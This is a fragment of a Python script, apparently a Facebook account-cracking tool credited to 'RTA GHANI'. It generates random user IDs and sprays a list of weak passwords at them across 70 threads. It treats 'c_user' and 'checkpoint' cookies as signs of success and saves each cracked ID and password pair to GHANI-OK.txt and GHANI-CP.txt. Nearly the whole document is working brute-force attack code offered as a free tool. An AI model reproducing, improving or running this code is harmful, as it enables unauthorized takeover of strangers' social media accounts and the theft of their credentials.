...
logo=("""
  ...
  ─────────────────────────────────────────────────
  WELCOME TO MY FREE TOOLS 🔥
  ─────────────────────────────────────────────────    
\33[1;37m----------------------------------------------
→   Owner      :  RTA GHANI 
→  Facebook :  USMAN ALI KHAN 
→TELEGRAM: 93731498976
→   Tools       :  RANDOM 
...
def bangla():
	os.system('clear')
	print(logo)
	print('[1] PAK \x1b[1;92mM 1')
	print('\x1b[1;97m[1] AFG \x1b[1;92mM 1')
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','۱۲۳۴۵۶']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'accept-language': 'en-US,en;q=0.9,ps-AF;q=0.8,ps;q=0.7',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[GHANI-OK] '+cid+'|'+ps+'\033[0;97m')
                open('GHANI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[GHANI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('GHANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mGHANI-KHAN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
